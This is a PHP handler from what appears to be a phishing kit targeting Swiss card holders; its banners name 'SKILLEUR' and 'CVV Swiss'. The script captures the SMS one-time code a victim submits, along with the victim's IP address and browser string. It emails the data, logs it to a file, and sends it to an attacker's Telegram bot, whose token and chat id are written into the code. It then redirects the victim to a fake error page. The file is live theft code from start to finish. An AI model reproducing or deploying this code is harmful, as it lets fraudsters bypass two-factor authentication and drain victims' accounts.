<?php
require_once('Imo.php');
$IP = getenv("REMOTE_ADDR");
$message .= "
------------------>SKILLEUR< ------------------>
------------------>[ SMS2 Swiss ] ------------------>\n";
$message .= " [ SMS2 ] : [  ".$_POST['otp']." ] \n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- SKILLEUR ----------------------\n";
$sender = "CVV Swiss";
$subject = "SMS2 Swiss [ " . $IP . " ] ";
$email = "".$EX445093_REMOT."";
mail($email,$subject,$message);
    $text = fopen('../Imo_SMS.txt', 'a');
fwrite($text, $message);
                $token = "5490148847:AAEJaLaG7CtbzMhFAWL8KjqWQ51FFWvdmJU";
$data = [
    'text' => $message,
    'chat_id' => '1901404668'
];

file_get_contents("https://api.telegram.org/bot5490148847:AAEJaLaG7CtbzMhFAWL8KjqWQ51FFWvdmJU/sendMessage?chat_id=1901404668&text=" . http_build_query($data) );
header("Location: ../otp/smserror.php");
?>